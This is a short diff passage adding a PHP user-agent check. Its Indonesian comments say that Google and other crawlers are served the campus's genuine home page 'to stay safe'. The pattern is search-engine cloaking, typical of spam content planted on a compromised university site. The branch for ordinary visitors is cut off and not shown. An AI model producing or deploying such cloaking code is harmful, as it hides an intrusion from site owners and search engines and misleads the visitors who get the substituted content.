@@ -1,3 +1,4 @@
+<?php
 // Jika robot Google atau crawler lain yang datang
 if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false || stripos($user_agent, 'crawl') !== false) {
     include('home.php');  // Berikan konten asli kampus agar aman
